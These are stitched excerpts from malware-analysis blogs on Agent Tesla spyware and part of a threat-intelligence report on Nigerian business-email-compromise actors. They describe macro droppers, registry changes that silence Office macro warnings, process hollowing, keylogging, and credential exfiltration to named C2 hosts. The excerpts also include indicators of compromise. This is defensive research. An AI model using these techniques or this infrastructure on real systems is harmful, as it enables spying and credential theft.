“filename.exe” and “filename.vbs” into the “%temp%\\\\subfolder”. It then exits the process after executing the file “filename.vbs”.\\xa0 Below, in figure 4, is the content of “filename.vbs”.\\nFigure 4. The content of filename.vbs\\nTo make it run automatically when the system starts, it adds itself (runs filename.vbs) to the system registry as a startup program. It then runs “%temp%\\\\filename.exe”.\\nFigure 5. The malware adds itself into the system registry as “RunOnce” item\\nAnalysis of filename.exe\\nWhen “filename.exe” starts, like most other malware it creates a suspended child process with the same name to protect itself. It then extracts a new PE file from its resource to overwrite the child process memory. Afterwards, it resumes the execution of the child process. This is when it executes the code of that new PE file, which is the main part of this malware.\\nFigure 6. Checking to see if the module mscorjit.dll is loaded\\nLet’s go on to the analysis of the child process. It first checks to see if the environment value of \"Cor_Enable_Profiling\" is set to 1, and if the modules \"mscorjit.dll\" and \"clrjit.dll\" have been loaded (see figure 6). If one of these checks is true, it exits the process without doing anything. \\xa0So far, I have no idea what the purpose of doing that is, but it is likely anti-something.\\nIf the process doesn’t exit, it loads a named resource. The resource name is \"__\", which is a string decrypted from a local variable. \\xa0Afterwards, by calling the API functions “FindResource” and “LoadResource”, it can read the resource data to the process memory. Figure 7 shows the “__” resource in CFF Explorer. For sure, the data is encrypted.\\nFigure 7. Encrypted “__” resource\\nBy decrypting the “__” data, we obtain another PE file, which is a .Net framework program. This is to be loaded into the child process memory. It reads sections of the .Net program into memory according to the PE file headers, imports APIs defined in the import table for .Net programs, relocates offset of the function “_CorExeMain”, as well as builds the .Net framework running environment by calling several APIs. Finally, it jumps to the entry point of the .Net program where it later jumps to “_CorExeMain” – which is the entry point of all .Net programs – to execute this .Net program. You can see in figure 8 how it jumps to the “_CorExeMain” function.\\nFigure 8. Jumping to the entry point of the .Net program\\nIn order to further analyze the .Net program, I dumped it from the child process memory into a local file. This allowed me to launch it independently rather than running it within the child process. This also allowed me to load it into the .Net program analysis tools to analyze it.\\nDeep analysis of the .Net program\\nThe dumped file has an incorrect PE header. I manually repaired it so that it can be executed, debugged, and parsed by .Net program analysis tools. Figure 8 shows the main function of the .Net program in an analysis tool.\\nFigure 9. The main function of the .Net program\\nAs you may have already noticed, it uses some kind of code obfuscation technique to increase the difficulty of code analysis. In the following parts, you may see that some of the names of method, class, variable, etc. have been modified to make them understandable.\\nAll the constant strings in the .Net program are encoded and saved within a large buffer, and every string is assigned an index. Whenever it needs to use the string, it calls a function with its string index to get the string. If the string is encoded, it throws the encoded string into another function to get it decoded. In figure 10 we can see that it reads the huge string into the big buffer—“Pkky9noglfauhKN1Fjq.QOZ4uWBaWw”.\\nHere is an example: “XtL6rF5GoidQVxdCxi.R6ybT342I(Pkky9noglfauhKN1Fjq.Y3LpEpC6nY(3172));”\\n“3172” is the string index.\\nThe “Pkky9noglfauhKN1Fjq.Y3LpEpC6nY” function picks up the string of index 3172 from that large buffer. In this case, it’s \"hyNN5z+7qAsS695lDXLuHg==\".\\n“XtL6rF5GoidQVxdCxi.R6ybT342I” is the decoding function. After decoding, we get the string “True\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00”. \\xa0i.e. “True”.\\nFigure 10. Reading strings in the large buffer\\nWhen the main function is called, it first pauses 15 seconds by calling “Thread::Sleep()” function. This allows it to potentially bypass sandbox detection.\\nAs my analysis in the previous blog showed, Agent Tesla is a spyware. It monitors and collects the victim’s keyboard inputs, system clipboard, screen shots of the victim’s screen, as well as collects credentials of a variety of installed software. To do that it creates many different threads and timer functions in the main function. So far, through my quick analysis, this version is similar to the older one. As I did not find much change, I won’t talk about it more here but simply refer you to the previous blog analysis.\\nHowever, the way of submitting data to the C&C server has changed. It used to use HTTP POST to send the collected data. In this variant, it uses SMTPS to send the collected data to the attacker’s email box.\\nBased on my analysis, the commands used in the SMTP method include “Passwords Recovered”, “Screen Capture”, and “Keystrokes”, etc.\\xa0 The commands are identified within the email’s “Subject” field. \\xa0For example:\\n“System user name/computer name Screen Capture From: victim’s IP”\\nHere’s an example to show you how it sends the collected credential data to the attacker’s email address. Figure 10 shows the email content that will be sent out with my PC information along with the collected credentials. It enables an SSL function and uses TCP port 587. The “Body” field is the collected data in HTML format. The “Subject” field contains the command “Passwords\\xa0Recovered\" which tells the recipient that this email contains credentials.\\nFigure 11. Email content with collected data\\nThe attacker registered a free zoho email account for this campaign to receive victims’ credentials. Figure 11, below, shows the SMTP server and its login information. You can see the attacker’s SMTP credential “UserName” and “Password” as well as the SMTP server.\\nFigure 12.\\nAttacker’s SMTP credential\\nWhen the email is sent out through the Wireshark tool, we were able to capture the packets shown in figure 12, below.\\nFigure 13. Collected data submission using SMTPS in wireshark\\nAs I explained above, the collected data in the mail body is in html format. I copied the html content into a local html file and was able to open it in the IE brower to see what the malware had harvested from my test enviroment. In figure 13, you can see the screenshot of my PC information along with the related credentials in an IE browser.\\nFigure 14 Harvested Credentials\\nDaemon program\\nIt also drops a daemon program from the .Net program’s resource named “Player” into the “%temp%” folder and run it up to protect “filename.exe” from being killed.\\nFigure 15. Dropping the daemon program and running it\\nThe daemon program’s name is made up of three random letters, as you can see in figure 15. It’s also a .Net program and its main purpose is very clear and simple. Figure 16 shows the daemon program’s entire code in an analysis tool.\\nYou can see that the main function receives a command line argument (for this sample, it’s the full path to “filename.exe”.) and saves it to a string variable called “filePath”. It creates a thread, and in the thread function it checks to see if the file “filename.exe” is running in each 900 millisecond. It runs it again whenever the “filename.exe” is killed.\\nFigure 16. Daemon program code\\nSolution\\nThe file “PPSATV.doc” has been detected as “W32/VBKrypt.DWSS!tr”, and “POM.exe” has been detected as “W32/VBKrypt.DWSS!tr” by FortiGuard AntiVirus service.\\nWe have informed \\xa0Zoho of the email account which is being used in this AgentTesla campaign.\\nIoC:\\nSample SHA256:\\nPPSATV.doc\\n13E9CDE3F15E642E754AAE63259BB79ED08D1ACDA93A3244862399C44703C007\\nPOM.exe\\nA859765D990F1216F65A8319DBFE52DBA7F24731FBD2672D8D7200CC236863D7\\nfilename.exe\\nB4F81D9D74E010714CD227D3106B5E70928D495E3FD54F535B665F25EB581D3A\\nRandom name daemon program\\nC2CAE82E01D954E3A50FEAEBCD3F75DE7416A851EA855D6F0E8AAAC84A507CA3\\nCheck out our latest\\xa0Quarterly Threat Landscape report for Q4\\xa0of 2017 for more details about recent threats.\\nSign up for our weekly FortiGuard\\xa0intel briefs\\xa0or\\xa0to be a part of our\\xa0open beta\\xa0of Fortinet’s FortiGuard Threat Intelligence Service.\\nTags:\\nms word,\\nvariant,\\nmalware,\\nnetwork security,\\ncybersecurity,\\nspyware\\nRelated Posts\\nThreat Research\\nSecurity Research News in Brief - October 2017 Edition\\nIndustry Trends\\nBest Practices to Help Safeguard Your Organization for the Internet of Things\\nThreat Research\\nIRS Notification?

I analyzed one of them, it\\'s a new variant from AgentTasla family. In this blog, I’m going to show you how it is able to steal information from a victim’s machine.\\nThe malware was spread via a Microsoft Word document that contained an auto-executable malicious VBA Macro. Figure 1 below shows how it looks when it’s opened.\\nFigure 1. When the malicious Word document is opened\\nWhat the VBA code does\\nOnce you click the “Enable Content” button, the malicious VBA Macro is executed covertly in the background. The code first writes some key values into the device’s system registry to avoid the Macro security warning when opening Word documents with risky content the next time.\\nHere are the key values it writes into system registry:\\nHKCU\\\\Software\\\\Microsoft\\\\Office\\\\{word version}\\\\Word\\\\Security\\\\,AccessVBOM, dword, 1\\nHKCU\\\\Software\\\\Microsoft\\\\Office\\\\{word version}\\\\Word\\\\Security\\\\,VBAWarning, dword, 1\\nFigure 2.

Indeed, it downloads the file “today.exe” to “%Temp%\\\\javs.exe”, and runs it.\\nThe downloaded exe file\\nFigure 3. Detailed information of the downloaded javs.exe file\\nFrom the analysis result of the PE analysis tool in Figure 3, we know that the downloaded “javs.exe” was built\\xa0with\\xa0.Net Framework. Looking at its icon, it is easy to assume that this is a pdf related file. But it’s not. This is simply a deception used to confuse the victim.\\nOnce executed, it starts another process by calling the function CreateProcessA with the CREATE_SUSPENDED flag. This procedure could allow the memory of the second process to be modified by calling the function WriteProcessMemory. Finally, the process is restored to run by calling the functions SetThreadContext and ResumeThread.\\nFigure 4, below, shows how CreateProcessA is called.\\nFigure 4. javs.exe calls CreateProcessA\\nThrough my analysis, I was able to determine that the data being injected into the second process by calling WriteProcessMemory is another executable file. This file was decoded from a BMP resource in the first javs.exe process. Interestingly, the injected executable was also built with .Net framework.\\nAs you may know, the .Net program only contains complied bytecode. This code can only be parsed and executed in its .Net CLR virtual machine. As a result, debugging a .Net program using the usual Ollydbg or Windbg tools is a challenge. So I had to determine which other analysis tools would work.\\nAnalysis of the second .Net program\\nFrom the above analysis, I was able to determine that the second .Net program had been dynamically decoded from the javs.exe process memory. So the next challenge was capturing its entire data and saving it as an exe file for analysis. To do that, I used the memory tool to dump it directly from the second process memory. Figure 5 shows what the dumped file looks like in the analysis tool.\\nFigure 5. Dumped memory file in analysis tool\\nThe “File is corrupted” warning obviously occurs because the dumped file’s PE header was wrong. I manually repaired the PE header using a sort of unpacking technique.\\xa0 After that, the dumped file could be recognized, statically analyzed, and debugged. In Figure 6 below, you can see the repaired file was recognized as a .Net assembly, and you even can see .NET Directory information in CFF Explorer.\\nFigure 6. Repaired dump file in analysis tool\\nThe author of the malware used some anti-analysis techniques to prevent it from being analyzed.\\xa0 For example, obfuscation is used to make the function names and variable names difficult to understand, and encoding is used to hide key words and data so analysts have a hard time understanding what it is trying to do. The repaired .Net program even causes the static analysis tool .NET Reflector to not work because the names of classes, functions, and variables are unreadable. From Figure 7 below, you can see what the code looks like using these techniques.\\nFigure 7. The Main function with anti-analysis techniques\\nTo better analyze the malware, I tried to rename parts of the unreadable names. So please note that in the following analysis the unreadable names in the referred code have been renamed to readable names.\\nOk, at this point we are finally ready to do the analysis.\\xa0 Let’s get started to see what is going to happen.\\nAnalysis of the .Net malware\\nOnce executed, it goes through the current running processes to kill any duplicate processes found. It then sends “uninstall” and “update” commands to the C&C server. If the response to the “uninstall” command from the server contains an “uninstall” string, it cleans up the information it has written on the victim’s machine and exits. When I ran the malware, no “uninstall” string was contained in the response, so I could proceed with the analysis. The following two Figures show you how the “update” command is sent to the C&C server.\\nFigure 8. Sending “update” command to C&C server\\nFigure 9. Function used to send data to the C&C server\\nFrom Figure 9, we learn that the URL of the C&C server is “hxxp://www.vacanzaimmobiliare.it/testla/WebPanel/post.php”, which was decrypted in the “SendToCCServer” function. The HTTP method is “POST”, which was also decrypted.\\nNext, it copies itself from “%temp%\\\\javs.exe” to “%appdata%\\\\Java\\\\JavaUpdtr.exe”. In this way it disguises itself by looking like an update program for Java. It then writes the full path into the value \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\load\" in the system registry so that “JavaUpdtr.exe” can be executed automatically when the system starts.\\nThe code snippet below shows us how the full path to “JavaUpdtr.exe” is defined.\\nprivate static string appdata_Java_JavaUpdtr.exe = Environment.GetEnvironmentVariable(\"appdata\") + \"\\\\\\\\Java\\\\\\\\JavaUpdtr.exe\";\\nThis malware can record the victim’s keyboard inputs, steal data from the system clipboard when its content changes, capture screenshots of the victim’s system screen, and collect credentials from installed software that the malware is interested in. To complete these tasks, it creates a variety of threads and timers.\\nIn the following sections I’ll discuss them in detail.\\nStealing keyboard inputs, system clipboard contents, and screen shots\\nBefore the Main function is called, three hook objects are defined in the construction function of the main class. These are used for hooking the Keyboard, Mouse, and Clipboard.\\xa0 It then sets hook functions for all of them so that when victim inputs something by keyboard, or when the clipboard data is changed (Ctrl+C), the hook functions will be called first. Figure 10 shows part of the hook function of the key down event.\\nFigure 10. Key “down” event hook function\\nIn this function, it first grabs the Window title where the victim types in and puts it into an html code. Next, it captures which key the victim presses, and converts the key code string into an html code. For example, “\". As you can see, the html code is concatenated to the variable “pri_string_saveAllStolenKey_Clipboard_Data”. Note: I modified the name to be readable.\\nIn the hook function for the system clipboard, it goes through a similar process. It captures the clipboard content every time the clipboard content is changed (e.g press Ctrl+C , Ctrl+X, etc.) by calling the function Clipboard.GetText(). It then puts the collected data into an html code, and again concatenates it to the variable “pri_string_saveAllStolenKey_Clipboard_Data”. Figure 11 is the code snippet of this function.\\nFigure 11. Clipboard change event hook function\\nIt also creates a timer whose function is called every 10 minutes.\\xa0 In the timer function, it captures screenshots of the victim’s screen and then uses the API “Graphics::CopyFromScreen” to grab the screenshots and saves them into the file “%appdata%\\\\ScreenShot\\\\screen.jpeg”. It later encodes the file screen.jpeg with base64 and then sends it to its C&C server using the command “screenshots”.\\nIt keeps taking screenshots every 10 minutes and sends them to the C&C server so the malware author can see what the victim is doing. Figure 12 shows the malware sending out a screen.jpeg file by calling the sending function.\\nFigure 12. Sending out a screenshot file\\nStealing the credentials of installed software\\nAt the end of the Main function, it creates another thread whose function is to collect credentials from a variety of software on the victim’s machine. It can collect user credentials from the system registry, local profile files, SQLite database files, and so on. Once it has captured the credentials of one the software packages it is looking for, it immediately sends it to the C&C server. One HTTP packet contains the credentials of one software package.\\nBased on my analysis, this malware is able to obtain the credentials from the following software.\\nBrowser clients:\\nGoogle Chrome, Mozilla \\xa0Firefox, Opera, Yandex, Microsoft IE, Apple Safari, SeaMonkey, ComodoDragon, FlockBrowser, CoolNovo, SRWareIron, UC browser, Torch Browser.\\nEmail clients:\\nMicrosoft Office Outlook, Mozilla Thunderbird, Foxmail, Opera Mail, PocoMail, Eudora, TheBat!.\\nFTP clients:\\nFileZilla, WS_FTP, WinSCP, CoreFTP, FlashFXP, SmartFTP, FTPCommander.\\nDynamic DNS:\\nDynDNS, No-IP.\\nVideo chatting:\\nPaltalk, Pidgin.\\nDownload management:\\nInternet Download Manager, JDownloader.\\nIn my test environment, I installed Microsoft Office Outlook with a Gmail account. Figure 13 shows what Outlook data is sent to the C&C server.\\nFigure 13.

This shift represented a signi˜cant evolution from traditional 419-style email scams to the use of commodity malware for ˜nancial gain. Two years later, in 2016, Unit 42 launched an unprecedented analytic effort to characterize the adoption of malware across this threat group in our report ﬁ SilverTerrier: The Next Evolution in Nigerian Cybercrime .ﬂ The results of that work identi˜ed substantial growth, with more than 100 actors or groups using ˜ve popular commodity malware tools to deliver thousands of attacks per month globally. Since the release of that paper, Palo Alto Networks has continued to monitor the evolution of this threat group. We have increased the scope of our analytic effort to include 15 commodity malware families employed by Nigerian actors. We also have now attributed more than 30,000 samples of malware to roughly 300 unique actors or groups that we continue track under the code name SilverTerrier . In the past year, these actors have conducted an average of 17,600 attacks per month, demonstrating a 45 percent increase from 2016. While simple commodity information stealers remain the most popular and widely deployed, there has been notable growth in the adoption of more complex remote administration tools, or RATs. Despite continued increases in both attacks and malware production, we found the number of active threat actors during a given month has begun to stabilize, suggesting improvements in terms of ef˜ciency. Additionally, we have observed that these actors continue to demonstrate increased organization. The social connections between these actors have become more robust and complex through leveraging social media platforms to promote their networking efforts. Through our analysis, it remains clear that Nigerian cyber actors will continue to expand their attacks in terms of size, scope and capabilities. According to law enforcement organizations, the exposed losses to businesses worldwide from these threat actors are now estimated to be more than US$3 billion. Given the substantial risk these actors pose, we present techniques to enable large-scale attribution efforts to combat this threat. In doing so, we demonstrate a repeatable and sustainable process to identify SilverTerrier infrastructure and put preventive measures in place prior to the ˜rst samples of malware reaching our security products. PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 3History Over the past decade, Nigerian cybercriminals have become notorious for advanced- fee-style schemes, such as the well-known Nigerian Prince scam. Also known as ﬁ419 scams,ﬂ based on the section of Nigerian criminal code that covers fraud, these schemes have historically leveraged email as a means to entice victims into transferring funds in exchange for the promise of generous returns. Although they were successful for several years, public awareness combined with anti-spam efforts have degraded the effectiveness of these campaigns. To adapt to changes in the cyber landscape, some Nigerian cybercriminals pursued efforts to develop fake websites to impersonate organizations and dupe unsuspecting victims. Always looking for an edge, other actors turned to malware as a means to enhance access to potential victims. In 2014, Unit 42 released a report titled ﬁ419 Evolution ﬂ that documented one of the ˜rst known cases of Nigerian cybercriminals using malware for ˜nancial gain. In 2016, Unit 42 launched an unprecedented analytic effort focused on developing a modern assessment of the size, scope and complexity of this threat. The resulting report identi˜ed substantial growth in the number of actors employing malware, the rate of malware delivery and the motivations behind these attacks. Most notably, in two short years, Nigerian actors evolved from using malware for simple ˜nancial gain to employing malware as part of complex Business Email Compromise, or BEC, schemes, which they refer to as ﬁWire Wireﬂ scams. These scams have proven to be tremendously pro˜table for cybercriminals. In the 2016 Internet Crime Report published by the FBI, BEC was speci˜cally highlighted as a ﬁHot Topicﬂ, having been attributed to more than US$360 million in losses and gaining status as its own category of attack. A few months later, in February 2017, the FBI published a press release revising its estimates and stating that ﬁSince January 2015, there has been a 1,300 percent increase in identi˜ed exposed losses, now totaling over $3 billion.ﬂ Recognizing the signi˜cance of this threat group, Unit 42 continues to track the evolution of Nigerian cybercrime under the code name SilverTerrier. Attacks Starting with their ability to distribute malware, Nigerian cyber actors as a whole continue to demonstrate substantial year-over-year gains. In 2016, we observed an average of 12,200 attacks per month, with surges exceeding a rate of 30,000 attacks on two separate occasions. In comparison, over the past year, the average rate has climbed to 17,600 attacks per month, signaling a 45 percent increase. During the same time period, the attackers™ ability to surge also increased, peaking at just over 41,000 attacks observed in August 2017 (see Figure 1). These metrics only provide insight into attacks against our customer base: to that end, we acknowledge the actual rates of attack worldwide likely exceed our metrics. Nevertheless, we believe the trend lines associated with our data set are representative of annual growth rates and emblematic of the pervasiveness of this threat group. PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 4Tools and Trends Individually, SilverTerrier actors continue to demonstrate varying degrees of technical pro˜ciency, ranging from novice to highly experienced. However, as a group, these actors continue to exhibit noteworthy year-over-year technical growth as they adopt new tools and techniques. Over the past three years, they have employed a total of 15 different malware families to support their illicit activities. Although the use of each malware family may rise and fall consistent with its popularity, capabilities, availability and detection rates, all the families share a commonality in that they are commodity malware tools that can be procured for nominal costs. To explore their use in more detail, we grouped the tools into two broad categories: information stealers and remote administration tools, or RATs. Information Stealers Predator Pain, Pony, KeyBase, ISpySoftware, ISR Stealer, Agent Tesla, LokiBot, Zeus and Atmos are all designed to provide a core information stealing capability. More speci˜cally, these tools are designed to steal usernames, passwords and other valuable credentials stored on an infected computer. These tools are widely available on underground forums, require minimal technical expertise to set up and are easy to deploy. Once infected, compromised systems transfer stolen information back to SilverTerrier actors using common internet protocols, such as Simple Mail Transfer Protocol, File Transfer Protocol or Hypertext Transfer Protocol Œ SMTP, FTP and HTTP, respectively. As a direct result, it™s dif˜cult to block the transfer of data with edge devices as these protocols blend in with normal activity on most networks. Analyzing their use of these nine malware families, Nigerian actors are currently producing an average of 840 unique samples of malware per month (see Figure 2). This represents a 17 percent increase over the past year. Figure 1 + Nigerian malware activity from July 2014 through July 2017 PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 5Though this growth is impressive, it is also misleading: each malware family™s contribution to the total varies greatly. By exploring the individual contribution of each family in more detail, it becomes possible to illuminate tools that are gaining popularity, those maintaining steady use and those that have fallen out of favor. Pony, LokiBot and Agent Tesla have emerged as the most popular information stealers in 2017. Pony is a fairly common malware family that has existed in various forms since 2012, with our ˜rst indications of Nigerian use occurring in August 2014. Since then, it has grown in popularity, reaching a peak of 858 samples in August 2017. Conversely, LokiBot and Agent Tesla are new malware tools. These two families have demonstrated steady growth over the past year, and we anticipate they will continue to climb in popularity and deployment over the next year (see Figure 3). Predator Pain and ISR Stealer are established and well-maintained tools that have received a number of upgrades over the years. Although both reached their peak between 2015 and 2016, they maintain a steady following of users. The result can be seen in a constant ˚ow of 20 samples per month of ISR Stealer and roughly 70 samples per month of Predator Pain (see Figure 4). Figure 2 + Information stealer samples from July 2014 through July 2017 Figure 3 + Growth of Agent Tesla, Pony and LokiBot from July 2014 through July 2017 PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 6Conversely, our data also shows that four malware families have fallen out of favor. KeyBase, ISpySoftware and Zeus all experienced peak periods between May 2015 and November 2016. On the other hand, Atmos maintained a small but never substantial following. Of the four, KeyBase stands out due to its rapid rise in popularity, with a peak deployment of 160 samples per month and usage by 46 separate SilverTerrier actors, followed by a fairly rapid decline. Despite individual successes at various times, all four malware families have since declined in popularity to a rate of fewer than 10 samples per month in the three-month period from June to August 2017 (see Figure 5). Remote Administration Tools NetWire, DarkComet, NanoCore, LuminosityLink, Remcos and Imminent Monitor are all designed to provide remote access to compromised systems. Although speci˜c capabilities vary, many of these tools can capture keystrokes, monitor web cameras, access network resources and provide remote desktop connections. These tools are widely available on the internet, and not just on underground forums. Instead, public websites, such as Nanocore.io, Luminosity.link and DarkComet.net, provide cybercriminals with a means to purchase the tools as well as seek technical support and advice on how to con˜gure and deploy the capabilities. Figure 4 + Continued use of Predator Pain and ISR Stealer from July 2014 through July 2017 Figure 5 + Decline of KeyBase, ISpySoftware and Zeus from July 2014 through July 2017 PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 7As the capabilities of RATs far exceed those of traditional information stealers, these tools require greater technical expertise to employ and more substantial infrastructure to control. Additionally, while information stealers transfer data periodically to command-and-control, or C2, servers that actors can check at a time of their choosing, RATs are more complex, requiring interaction with an adversary to be of value. Given this requirement, SilverTerrier actors often rely on Dynamic DNS and virtual private servers to provide a layer of obfuscation to protect their identities. Unit 42 analyzed the use of these six malware families and found that Nigerian actors are currently producing an average of 146 unique samples of malware per month (see Figure 6). This represents a 49 percent increase over the past year. Although the monthly sample rate is a fraction of what we observe with information stealers, the annual growth rate is far more substantial. We are currently tracking 40 SilverTerrier actors who have already demonstrated the technical ability to employ these tools, and we anticipate these numbers will continue to rise sharply over the next year. With respect to growth, NetWire, DarkComet and NanoCore stand out from their peers. Although none of these malware families are new, our data shows that NetWire and DarkComet both broke from a pattern of steady use and began to demonstrate greater adoption beginning in early 2017. In particular, NanoCore represents a fascinating case. This malware family began to demonstrate growth in January 2016 before reaching a peak in April 2017 with just over 100 samples. However, that same month, it was reported that the author behind NanoCore was arrested by the FBI, and since then, Figure 6 + RAT samples from July 2014 through July 2017 Figure 7 + Growth of NetWire, DarkComet and NanoCore from July 2014 through July 2017 PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 8we have observed a reduction Œ but not a complete decline Œ in its use. Despite this development, at the end of August 2017, SilverTerrier actors continued to produce more than 30 samples per month of each of these malware families (see Figure 7). This brings us to the last three tools: LuminosityLink, Remcos and Imminent Monitor. Of the three, Imminent Monitor is the oldest and most established RAT, dating back to early 2013. LuminosityLink was released more recently in May 2015, and Remcos was ˜rst seen in June 2016. What is most interesting about these release dates is that, in both cases, SilverTerrier actors demonstrated an early ability to produce samples of these new tools. This provides unique insights into the technical pro˜ciency of certain actors as well as their ability to gain access to new tools as they are released. However, as quickly as actors can adopt new tools, they can also abandon them. As of August 2017, all three of these tools have declined in popularity to a rate of fewer than 10 samples per month (see Figure 8). Malware Deployment Trends SilverTerrier actors continue to re˜ne and adjust their techniques for deploying malware consistent with their respective levels of experience. In the past year, we have identi˜ed 7,100 samples of malware associated with more than 181,000 attacks. This wealth of information continues to bolster informative analysis concerning malware distribution and C2 domains. Malware Distribution As these actors transition from their renowned email scams to the use of malware for ˜nancial gain, they have learned to scope the sizes of their target audiences. When using email scams, SilverTerrier actors preferred to use large target audiences, which maximized the likelihood of success with very little risk. However, nominal as it may be, there is a cost associated with generating new malware samples in terms of currency as well as time and energy required to establish C2 infrastructure. As a result, the majority of SilverTerrier actors continue to limit their target audiences in hopes of reducing the exposure of their malware to antivirus programs. Figure 8 + Decline of LuminosityLink, Remcos and Imminent Monitor from July 2014 through July 2017 PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 9Our data shows 84 percent of the malware samples were observed in fewer than 20 attacks against our customers. Moreover, 92 percent of samples were sent to 50 recipients or fewer (see Figure 9). These numbers are on par with ˜ndings from previous years and remain signi˜cant as they demonstrate a consistent trend among all SilverTerrier actors to tailor their malware delivery to focused target sets. In stark contrast, these actors are less than discriminating when it comes to the industries they target. Across our customer base, the high technology and higher education sectors continue to serve as the top two target areas, consistent with previous years. At the same time, attacks against the wholesale, transportation and telecommunication sectors have climbed substantially over the past year, securing positions three through ˜ve, respectively (see Figure 10). Regardless of this short list, it is important to note that we continue to witness attacks against every sector we track. C2 DomainsTo support the rapid growth and pace of malware distribution efforts, SilverTerrier actors are in constant need of domains to serve as C2 nodes. This drives a largely cyclical process in which an actor registers a domain name and allows it to sit for a period of time, potentially improving the domain™s reputation. The domain is then weaponized to support malware schemes and, eventually, identi˜ed and blacklisted Figure 9 + Number of times malware samples were observed Figure 10 + Top ˜ve targeted industries PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 10by antivirus vendors and domain registrars. When this occurs, the actor simply moves on to the next domain on his or her list and continues the process. Unit 42 tracks roughly 300 SilverTerrier actors who have registered a combined 11,600 domains over the past ˜ve years. These domains range in status from newly registered to suspended as well as to those that have now expired but serve to provide historical context surrounding an actor™s activity. These domains also vary greatly in their usage. For example, some actors only register domains with the intent of supporting their malicious activities. However, it would be false to assume all actors follow this model. Instead, a considerable number of actors run legitimate businesses and simply use malware to supplement their income. In these cases, it becomes necessary to evaluate domains based on their individual merits to determine whether they serve benign or malicious purposes. Across our data set, 19.3 percent of the 11,600 domains have been directly liked to malware activity. Another 6.6 percent have been associated with fraudulent activities, such as fake banking and shipping websites, distribution of spam, and other illicit activities. Additionally, 2.3 percent of domains provided email services that were used as mechanisms to deliver malware to victims. Combining all three Œ that is, malware activity, fraudulent activity and malicious email services Œ and accounting for the fact that some domains served a dual purpose, a total of 27.6 percent of domains registered by SilverTerrier actors have been linked to malicious activity. Conversely, our analysis also reveals that a much smaller subset (1.2%) of the domains were registered to support legitimate business functions. Subsequently, there is also the remaining 71.2 percent of domains for which there is no ˜rm evidence to support either legitimate or malicious use. Yet, although it is ultimately challenging to prove intent, the association of a domain to a SilverTerrier actor combined with analysis of domain names and registration details often provides valuable indicators. Following this approach, we assess that the vast majority of these domains were registered by actors with the intent of supporting illicit activity. To illustrate this point, consider the registration details for the domains us-army-mil. us and shell-ae.com (see Figure 11). Figure 11 + Registration details for us-army.mil.us and shell-ae.com PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 11In both examples, the domain names themselves can be used to provide indicators as to the actor™s intent. To that end, it is very unlikely that the United States government or Shell, a global energy company, would commission SilverTerrier actors to develop domains that impersonate their own legitimate websites and services. Moreover, the second example further demonstrates the value of individual registration details. Understanding that Nigerian actors use the term ﬁWire Wireﬂ to describe BEC schemes, it is possible to draw conclusions about a domain registered under the name ﬁWire Lordﬂ with an address referencing a ﬁWorld Bank Housing Estate.ﬂ Unfortunately, these two cases are by no means unique. It is fairly common for Nigerian actors to establish domains with slight misspellings that impersonate legitimate organizations they intend to target, a practice sometimes referred to as ﬁtyposquatting.ﬂ Although this is still the most prevalent technique for actors employing information stealers, it does not apply to all malware families. Given the requirements of RATs, we also observed growth in the adoption of Dynamic DNS services. DDNS complicates the ability to identify actors, but we have found that many of these hurdles are surmountable as next-generation ˜rewall, or NGFW, technology provides a wealth of technical indicators that can be applied to empower advanced threat analytics. For example, doncjpd.ddns.net and puffydon.ddns.net both serve as C2 domains for NetWire. Because they are sponsored by a free DDNS provider, no additional ownership information is publicly available. Despite this constraint, NGFW analysis can be leveraged to illuminate unique and rare behaviors shared between individual malware samples. In practice, these details enable correlation with other domains registered to the same email address: cj_pu˜y2004 @ yahoo.com . Using advanced analytic resources, it then becomes possible to quickly enumerate more than 75 additional domains associated with just one actor. Who Are They? Exploring SilverTerrier actors in more detail, we™ve con˜rmed a set of common characteristics that continue to resonate and hold true as well as, interestingly, buck traditional stereotypes associated with cybercriminals. For example, these actors take little to no care to remain anonymous. The credentials they use to register their malware infrastructure are easily associated with their public social media accounts on Google®, Facebook ®, MySpace®, Instagram ®, and various dating and blogging sites. Despite the passage of laws prohibiting fraud, scams and other illicit activity, the culture in Nigeria remains permissive of cybercrime, and widespread enforcement of the laws has yet to be observed. Although social media accounts should never be considered de˜nitive sources of information, they can still provide signi˜cant insights into the demographics associated with these actors. Speci˜cally, the accounts reveal that SilverTerrier actors are mostly mature adults, not children or teenagers. They range in age from their 20s to 40s with few exceptions, and the vast majority are estimated to be in their 30s. Many of the actors are married with children and have held a variety of legitimate jobs throughout their careers. Further, these actors are also allegedly educated, with more than 55 percent of attributed actors listing colleges and universities on their pro˜les and one actor claiming to be a lecturer at a local university. PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 12It is also important to note that, when it comes to career choice and motivation, each SilverTerrier actor is unique and falls across a diverse spectrum. Among the list of actors are those who pursue cybercrime as a full-time activity; those who provide enabling activities, such as web hosting or domain resale; and those who own a mix of legitimate and fraudulent domains. With the latter, we assess that many such actors view cybercrime as a means to supplement their legitimate income, as they most often maintain employment with organizations in the technology, education, media or music industries. At the same time, a second consideration that should not be discounted is that each actor pursues cybercrime only for a limited time period of their choosing. For example, our data set contains more than 300 actors, but it should not be inferred that each actor is active every month. We have observed that, between early 2015 and early 2016, the number of actors active in a given month tripled over the course of a year, from roughly 30 to 100 actors. Since early 2016, the number of active actors has remained relatively steady, hovering between 75 and 117 over the past year (see Figure 12). These metrics demonstrate a degree of equilibrium among the SilverTerrier population, with new actors joining these malicious activities at a rate consistent with those departing cybercrime. Often perceived as a positive situation, this state of equilibrium also raises concerns as it suggests the actors are becoming more pro˜cient due to growth in malware production and observed attacks over the same time period. Shifting to their geographical dispersion, many SilverTerrier actors are situated in and around the major cities of Nigeria. Nevertheless, a small contingent of Nigerian actors has been identi˜ed outside Nigeria 